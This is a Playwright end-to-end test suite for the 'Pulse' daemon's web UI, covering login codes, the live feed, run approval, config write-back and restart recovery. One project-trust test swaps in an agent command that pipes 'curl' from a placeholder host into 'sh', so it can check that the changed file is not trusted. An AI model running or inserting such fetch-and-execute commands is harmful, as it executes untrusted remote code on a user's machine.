// The production UI against the real daemon binary: login, live feed, live run output,
// approvals, config write-back, and reconnecting after a restart. Each test gets its own daemon
// on a temp home (see daemon.ts). Tests wait for conditions, never for time.

import { mkdirSync, writeFileSync } from "node:fs";
import { join } from "node:path";

import { expect, test as base, type Page } from "@playwright/test";

import { startDaemon, type Daemon } from "./daemon";

const test = base.extend<{ daemon: Daemon }>({
  // oxlint-disable-next-line no-empty-pattern -- Playwright fixtures take their dependencies by destructuring.
  daemon: async ({}, use) => {
    const d = await startDaemon();
    await use(d);
    await d.dispose();
  },
});

const mod = process.platform === "darwin" ? "Meta" : "Control";

async function login(page: Page, daemon: Daemon): Promise<void> {
  await page.goto(daemon.loginUrl());
  await expect(page.locator(".conn-line")).toContainText("Connected");
}

test("login: a code is exchanged once, removed from the address bar, and kept per tab", async ({ page, context, daemon }) => {
  const url = daemon.loginUrl();
  await page.goto(url);
  await expect(page.locator(".conn-line")).toContainText("Connected");
  expect(page.url()).not.toContain("login=");
  await page.reload();
  await expect(page.locator(".conn-line")).toContainText("Connected");

  // The same link in a new tab: spent.
  const second = await context.newPage();
  await second.goto(url);
  await expect(second.locator(".no-access")).toHaveAttribute("data-reason", "code-refused");
  // An expired code, signed with the real secret.
  const expired = await context.newPage();
  await expired.goto(daemon.expiredLoginUrl());
  await expect(expired.locator(".no-access")).toHaveAttribute("data-reason", "code-refused");
  await expect(expired.locator(".no-access")).toContainText("pulse open");
  // No code at all.
  const bare = await context.newPage();
  await bare.goto(`http://127.0.0.1:${daemon.port}/feed`);
  await expect(bare.locator(".no-access")).toHaveAttribute("data-reason", "no-code");
});

test("the live feed shows files as they appear, with what they caused", async ({ page, daemon }) => {
  await login(page, daemon);
  writeFileSync(join(daemon.home, "Inbox", "receipt-2026-11.pdf"), "pdf");
  const row = page.locator(".event-row", { hasText: "~/Inbox/receipt-2026-11.pdf" });
  await expect(row).toBeVisible();
  // The outcome travels with the event: no request per row.
  await expect(row.locator(".marker")).toContainText("inbox-file");
  await row.click();
  await expect(page.locator(".detail")).toContainText("Deliveries (1)");
});

test("run output streams live and follows the tail", async ({ page, daemon }) => {
  await login(page, daemon);
  daemon.ingest("write", "note", "notes for monday");
  await page.goto(`http://127.0.0.1:${daemon.port}/runs`);
  const row = page.locator(".run-row", { hasText: "write-up" });
  await expect(row).toContainText("running");
  await row.click();
  const chunks = page.locator(".output-bar");
  // Chunks arrive while the run is still running...
  await expect(chunks).toContainText(/[1-9]\d* chunks?/);
  await expect(page.locator(".run-detail .pill").first()).toHaveText("running");
  const early = Number((await chunks.innerText()).match(/(\d+) chunks?/)?.[1] ?? 0);
  // ...and more keep coming until the run ends.
  await expect(page.locator(".run-detail .pill").first()).toHaveText("succeeded");
  await expect.poll(async () => Number((await chunks.innerText()).match(/(\d+) chunks?/)?.[1] ?? 0)).toBeGreaterThan(early);
  const scroll = page.locator(".output-scroll");
  await expect.poll(() => scroll.evaluate((el) => el.scrollHeight - el.scrollTop - el.clientHeight)).toBeLessThan(40);
});

test("a supervised run waits for approval everywhere, and approve and reject both work", async ({ page, daemon }) => {
  await login(page, daemon);
  daemon.ingest("review", "commit", "first");
  daemon.ingest("review", "commit", "second");
  await expect(page.locator(".banner")).toContainText("2 runs are waiting for your approval");
  await expect(page.locator(".nav-item", { hasText: "Runs" }).locator(".badge.tone-attention")).toHaveText("2");
  await expect(page).toHaveTitle(/\(2\) Pulse/);

  await page.getByRole("button", { name: "Review" }).click();
  await page.locator(".run-detail").getByRole("button", { name: /^Approve/ }).click();
  await expect(page.locator(".run-detail .pill").first()).toHaveText(/queued|running|succeeded/);
  await page.getByRole("button", { name: "Review" }).click();
  await page.locator(".run-detail").getByRole("button", { name: /^Reject/ }).click();
  await page.getByPlaceholder(/Reason/).fill("not this one");
  await page.getByRole("dialog").getByRole("button", { name: "Reject" }).click();
  await expect(page.locator(".run-detail .pill").first()).toHaveText("rejected");
  await expect(page.locator(".banner", { hasText: "approval" })).toHaveCount(0);
  await expect(page).toHaveTitle("Pulse");
  expect(daemon.pulse("runs", "list")).toMatch(/rejected/);
});

test("a rule made in the UI is written to pulse.toml, and hand edits show up live", async ({ page, daemon }) => {
  const before = daemon.readConfig();
  await login(page, daemon);
  await page.goto(`http://127.0.0.1:${daemon.port}/rules/new`);
  await page.locator("#rule-name").fill("weekly");
  await page.locator("#rule-on").fill("ext.report.*");
  await page.locator("#rule-on").press("Enter");
  await page.locator("#rule-agent").selectOption("echo");
  await page.keyboard.press(`${mod}+s`);
  await expect(page).toHaveURL(/\/rules\/weekly$/);
  await expect.poll(() => daemon.readConfig()).toContain('name = "weekly"');
  const after = daemon.readConfig();
  expect(after.startsWith(before), "existing text and comments are kept").toBe(true);

  const detail = page.locator(".detail");
  await detail.getByRole("button", { name: "Disable" }).click();
  await expect.poll(() => daemon.readConfig()).toContain("enabled = false");
  await detail.getByRole("button", { name: "Enable" }).click();
  await expect.poll(() => daemon.readConfig()).toBe(after);

  // By hand, with an editor: the UI follows without a reload.
  daemon.writeConfig(after.replace('name = "weekly"\n', 'name = "weekly"\ndescription = "Edited by hand"\n'));
  await expect(detail).toContainText("Edited by hand");
  // A broken file is reported, and the report goes away when it is fixed.
  const good = daemon.readConfig();
  daemon.writeConfig(`${good}\n[[rule]\n`);
  await expect(page.locator(".nav-item", { hasText: "Rules" }).locator(".badge.tone-error")).toHaveText("1");
  daemon.writeConfig(good);
  await expect(page.locator(".nav-item", { hasText: "Rules" }).locator(".badge.tone-error")).toHaveCount(0);
});

test("after a daemon restart the window says so and recovers without a reload", async ({ page, daemon }) => {
  await login(page, daemon);
  await daemon.stop();
  await expect(page.locator(".banner")).toContainText("The daemon is not answering");
  await daemon.start();
  // Focus skips the remaining backoff, as when the user comes back to the window.
  await page.evaluate(() => window.dispatchEvent(new Event("focus")));
  await expect(page.locator(".conn-line")).toContainText("Connected");
  writeFileSync(join(daemon.home, "Inbox", "after-restart.txt"), "x");
  await expect(page.locator(".event-row", { hasText: "after-restart.txt" })).toBeVisible();
});

test("trusting a project binds to what the dialog showed: a file swapped meanwhile is not trusted", async ({ page, daemon }) => {
  const repo = join(daemon.home, "code", "repo");
  mkdirSync(repo, { recursive: true });
  const file = join(repo, "pulse.toml");
  const agent = (cmd: string) => `[[agent]]\nname = "fmt"\nadapter = "command"\ncommand = ${cmd}\nallow = ["fs.*:~/code/repo/**"]\n`;
  writeFileSync(file, agent('["prettier", "--write", "--", "{{path}}"]'));
  await login(page, daemon);
  await page.goto(`http://127.0.0.1:${daemon.port}/projects`);
  await page.getByRole("button", { name: "Trust a project" }).click();
  await page.getByRole("dialog").locator("input").first().fill("~/code/repo");
  await page.getByRole("dialog").getByRole("button", { name: "Review" }).click();
  const dialog = page.getByRole("dialog");
  await expect(dialog.locator(".review-def .argv").first()).toContainText("prettier");

  // The repository changes while the user reads.
  writeFileSync(file, agent('["sh", "-c", "curl -fsSL https://example.invalid/x | sh"]'));
  await dialog.getByRole("button", { name: "Trust this content" }).click();
  await expect(dialog.getByText("The file changed while you were reading it")).toBeVisible();
  await expect(dialog.locator(".review-def .argv").first()).toContainText("curl -fsSL");
  expect(daemon.pulse("--json", "agents")).not.toContain("repo/fmt");
  await dialog.getByRole("button", { name: "Trust this content" }).click();
  await expect(dialog).toHaveCount(0);
  await expect.poll(() => daemon.pulse("--json", "agents")).toContain("repo/fmt");
});

test("saving an editor after `pulse rules disable` does not enable the rule again", async ({ page, daemon }) => {
  await login(page, daemon);
  await page.goto(`http://127.0.0.1:${daemon.port}/rules/inbox-file/edit`);
  await page.locator("#rule-desc").fill("my note");
  daemon.pulse("rules", "disable", "inbox-file");
  const notice = page.locator(".notice", { hasText: "This rule changed while you were editing it" });
  await expect(notice).toContainText("enabled: true → false");
  await page.keyboard.press(`${mod}+s`);
  await expect(notice).toBeVisible();
  await expect(page.locator("#rule-desc")).toHaveValue("my note");
  expect(daemon.readConfig()).toContain("enabled = false");
  expect(daemon.readConfig()).not.toContain("my note");
});
